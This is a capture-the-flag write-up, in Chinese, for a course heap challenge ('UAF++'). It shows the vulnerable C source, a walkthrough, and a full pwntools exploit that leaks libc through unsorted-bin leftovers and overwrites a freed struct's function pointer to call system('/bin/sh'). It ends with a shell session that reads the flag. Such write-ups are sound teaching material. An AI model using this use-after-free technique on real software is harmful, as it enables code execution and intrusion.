---
title: Simple PWN 0x40(2023 HW - UAF++)
tags: [eductf, CTF, PWN]

---

# Simple PWN 0x40(2023 HW - UAF++)
## Background
[0x34(2023 Lab - UAF):three:](https://hackmd.io/@SBK6401/SJWc9v4Bp)
## Source code
:::spoiler Source Code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void default_handle(char *event)
{
	printf("EVENT: get event named \"%s\"!\n", event);
}

struct entity
{
	char *name;
	char *event;
	void (*event_handle)(char *);
};

struct entity *entities[0x2];

int read_int()
{
	char buf[0x20];
	read(0, buf, 0x1f);
	return atoi(buf);
}

int get_idx()
{
	int idx = read_int();
	if (idx >= 0x2 || idx < 0)
		exit(0);
	return idx;
}

void memu()
{
	puts("1. register entity");
	puts("2. delete entity");
	puts("3. trigger event");
	printf("choice: ");
}

void register_entity()
{
	int idx;
	int len;
	printf("Index: ");
	idx = get_idx();
	entities[idx] = malloc(sizeof(struct entity));
	entities[idx]->event = "Default Event";
	entities[idx]->event_handle = default_handle;
	printf("Nmae Length: ");
	len = read_int();
	if (len == 0 || len > 0x430)
		exit(0);
	entities[idx]->name = malloc(len);
	printf("Name: ");
	read(0, entities[idx]->name, len - 1);
}

void delete_entity()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	if (entities[idx])
	{
		free(entities[idx]->name);
		free(entities[idx]);
	}
	else
		puts("Invalid index");
}

void trigger_event()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	if (entities[idx])
	{
		printf("Name: %s\n", entities[idx]->name);
		entities[idx]->event_handle(entities[idx]->event);
	}
}

int main(void)
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	for (;;)
	{
		memu();
		int choice = read_int();
		switch (choice)
		{
		case 1:
			register_entity();
			break;
		case 2:
			delete_entity();
			break;
		case 3:
			trigger_event();
		default:
			puts("Invalid command");
		}
	}
	return 0;
}

```
:::
## Recon
:::info
* 這一題是run在==20.04==的環境，在做題目之前要先看一下docker file
* 另外一個很重要的一點是題目是用==read==讀取輸入，所以我們不需要輸入null byte結尾
:::

這一題和lab有幾個關鍵的地方不太一樣，首先他把set_name的操作併到register的地方，另外他限制註冊的entity只能有==2個==，最重要的一點是他沒有給我們heap address或system address的天大好禮，所以我們還要想一下其他的方法

1. 首先，思路會是先想辦法leak libc address，並且利用像lab的方式把system function trigger起來開一個shell給我們
    
    leak libc的策略如下，就像background提到的，要leak libc就要先想辦法把chunk丟到unsorted bin中，所以大小不能太小，lab的作法是先把tcache填滿再free一個0x88(就是不會被丟到fastbin的大小)，不過因為這一題只能讓我們註冊兩個entity，所以有沒有甚麼方式是可以直接丟到unsorted bin?那就是直接註冊超過0x410的大小，這樣free的時候就會被丟到unsorted bin
    ```python
    register(0, 0x420, b'a')
    register(1, 0x420, b'a')
    delete(0)
    delete(1)
    register(0, 0x420, b'a')
    trigger_event(0)
    ```
    下圖為停在delete完後的結果，因為entity 1的0x420被consolidate所以沒有被顯示出來
    ![圖片](https://hackmd.io/_uploads/B1TitfiBT.png)
    而再註冊一次的意思是要把unsorted bin的空間拿回來，又因為他沒有把空間洗掉，所以我們後面再trigger的時候他會把東西印出來給我們，從下圖可以知道entity 0的name指向==0x00005575416a52c0==，也就是一開始從unsorted bin拿到的chunk address，而裡面的數值也的確還殘留
    ![圖片](https://hackmd.io/_uploads/BkbTszjBp.png)
    如果實際trigger entity 0會如下圖一樣，print出name指向的東西
    ![圖片](https://hackmd.io/_uploads/r1gS2MjS6.png)
2. 既然可以leak出libc的地址，當然我們也可以寫值進去，我們的目標是開一個shell，而唯一可以執行function的就是在trigger event的地方，假設我們可以寫成如下圖一樣，是不是就可以觸發shell了
    ![圖片](https://hackmd.io/_uploads/BkDyeXoST.png)
    ![圖片](https://hackmd.io/_uploads/ryBggQiB6.png)
3. 要達成如上的效果，我會先reset各個entity，為甚麼要設定0x20之後會用到
    ```python
    register(0, 0x20, b'a')
    register(0, 0x20, b'a')
    register(1, 0x20, b'a')
    ```
4. 仔細看source code中註冊的部分，他一共會malloc兩個空間，一個是固定0x20的entity，另外一個就是我們自己設定的name空間，這個空間可以寫值；另外call function pointer的時候，也就是在trigger event的地方，他只會針對剛剛提到的0x20 entity space去call function，所以我們要想辦法把我們寫進去的值==被當成0x20的entity==，這樣的話就可以直接call system了，這最後一步想了超級久，原本是想隔天在戰，結果躺在床上五分鐘就來靈感了，再花五分鐘就把問題解掉了😑
    
    具體流程如下
    ```python
    delete(1)
    delete(0)
    register(0, 0x18, p64(0) + p64(bin_sh_addr) + p64(system_addr))
    trigger_event(1)
    ```
    首先把這兩個entity都free掉，這樣回收區就會如下圖一樣
    ![圖片](https://hackmd.io/_uploads/B1fdM7iHT.png)
    接著我們註冊entity 0，又因為這一次要的空間是0x18，所以他會把前面entity 1的空間都拿回來使用，如果我們又把開shell的資訊寫進去，就會如下圖
    ![圖片](https://hackmd.io/_uploads/Sk6GXXoS6.png)
    此時原本被free掉的entity 1的空間就會變成entity 0的name space，此時我們只要trigger entity 1就會開shell了，如下圖
    ![圖片](https://hackmd.io/_uploads/ByhCXQjrT.png)

## Exploit
```python
from pwn import *

# r = process('./chal')
r = remote('10.113.184.121', 10059)
context.arch = 'amd64'

def register(idx, name_len, name):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Nmae Length: ')
    r.send(str(name_len).encode())
    r.recvuntil(b'Name: ')
    r.send(name)

def delete(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

def trigger_event(idx):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())


# Fetch Info
## Leak libc address
register(0, 0x420, b'a')
register(1, 0x420, b'a')
delete(0)
delete(1)
register(0, 0x420, b'a')
trigger_event(0)
r.recvuntil(b'Name: ')
leak_libc = u64(r.recv(6).ljust(0x8, b'\x00'))
libc_base = leak_libc - 0x1ecb61
system_addr = libc_base + 0x52290
log.success(f'Leak libc address = {hex(leak_libc)}')
log.success(f'Libc base address = {hex(libc_base)}')
log.success(f'System address = {hex(system_addr)}')
print(r.recvlines(3))

## Leak heap address
bin_sh_addr = libc_base + 0x00000000001b45bd
### To reset entities
register(0, 0x20, b'a')
register(0, 0x20, b'a')
register(1, 0x20, b'a')
delete(1)
delete(0)
register(0, 0x18, p64(0) + p64(bin_sh_addr) + p64(system_addr))
trigger_event(1)

r.interactive()
```
```bash
$ python exp.py
[+] Opening connection to 10.113.184.121 on port 10059: Done
[+] Leak libc address = 0x7f890a134b61
[+] Libc base address = 0x7f8909f48000
[+] System address = 0x7f8909f9a290
[b'', b'EVENT: get event named "Default Event"!', b'Invalid command']
[*] Switching to interactive mode
Name: (null)
$ cat /home/chal/flag.txt
flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}
```

Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`